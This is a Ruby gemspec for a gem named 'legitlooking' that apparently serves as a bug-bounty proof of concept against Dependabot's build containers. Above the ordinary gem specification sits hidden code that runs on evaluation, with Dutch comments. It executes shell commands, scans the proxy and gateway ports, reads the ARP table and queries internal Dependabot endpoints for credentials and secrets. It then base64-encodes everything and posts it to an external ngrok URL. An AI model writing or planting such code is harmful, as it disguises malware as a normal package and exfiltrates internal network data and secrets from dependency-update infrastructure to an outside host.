# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 3000] }
  lines = []

  # ============================================================
  # BUNDLER CONTAINER: proxy staat APART op 172.19.0.2
  # Probeer de proxy te targetten via zijn eigen verbinding --
  # de proxy maakt UITGAANDE verbindingen naar de Dependabot API.
  # Misschien kunnen we die verbindingen onderscheppen.
  # ============================================================

  # Welk IP heeft DEZE container?
  lines << "=== CONTAINER IP ==="
  lines << cmd.("hostname -I")
  lines << cmd.("ip addr show")

  # Kunnen we de proxy-container rechtstreeks SSH-en of andere ports?
  lines << "\n=== PROXY CONTAINER EXTRA PORTS (ruimer scan) ==="
  (1..1024).step(50).each do |port|
    r = cmd.("curl -s --max-time 1 -o /dev/null -w '%{http_code}' --noproxy '*' http://172.19.0.2:#{port}/")
    lines << "#{port}: #{r}" unless r == "000"
  end
  # En hogere ports
  [1080, 2080, 3000, 4000, 5000, 8080, 9090, 9999, 10080, 15080, 16000].each do |port|
    r = cmd.("curl -s --max-time 1 -o /dev/null -w '%{http_code}' --noproxy '*' http://172.19.0.2:#{port}/")
    lines << "port #{port}: #{r}"
  end

  # Kunnen we de proxy bereiken op UDP?
  lines << "\n=== PROXY UDP/ICMP ==="
  lines << cmd.("ping -c 1 -W 2 172.19.0.2")

  # Is er een derde container? (172.19.0.1 = gateway/host?)
  lines << "\n=== HOST GATEWAY SCAN ==="
  lines << cmd.("ping -c 1 -W 2 172.19.0.1")
  [80, 443, 2376, 2377, 4243, 7777, 8080].each do |port|
    r = cmd.("curl -s --max-time 2 -o /dev/null -w '%{http_code}' http://172.19.0.1:#{port}/ 2>&1")
    lines << "gateway:#{port}: #{r}"
  end

  # ARP tabel -- welke hosts zijn bekend?
  lines << "\n=== ARP TABEL ==="
  lines << cmd.("cat /proc/net/arp")
  lines << cmd.("ip neigh")

  # Dependabot internal API -- zijn er andere endpoints?
  lines << "\n=== DEPENDABOT API ENDPOINTS ==="
  job_id = ENV["DEPENDABOT_JOB_ID"] || ""
  [
    "/update_jobs/#{job_id}/details",
    "/update_jobs/#{job_id}/credentials",
    "/update_jobs/#{job_id}/secrets",
    "/update_jobs/#{job_id}/registries",
    "/update_jobs/#{job_id}/job_parameters",
  ].each do |path|
    r = cmd.("curl -s --max-time 5 -w '\\n%{http_code}' https://dependabot-actions.githubapp.com#{path}")
    lines << "#{path}: #{r[-3..]}: #{r[0, 200]}"
  end

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=container_escape_v2")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 60) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=container_escape_v2&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.28"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
